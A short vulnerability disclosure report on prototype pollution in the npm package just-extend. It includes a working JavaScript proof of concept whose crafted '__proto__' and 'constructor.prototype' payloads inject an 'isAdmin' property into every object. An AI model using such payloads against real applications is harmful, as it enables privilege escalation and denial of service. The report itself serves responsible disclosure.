# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `just-extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` or `{__proto__: {...}}` and send it to `just-extend`.

```javascript
var extend = require('just-extend');

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
extend(true, {}, payload1);
console.log({}.isAdmin); // true

var payload2 = JSON.parse('{"__proto__": {"isAdmin2": true}}');
extend(true, {}, payload2);
console.log({}.isAdmin2); // true
```

# Wrap up

- I contacted the maintainer to let them know: [Y]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
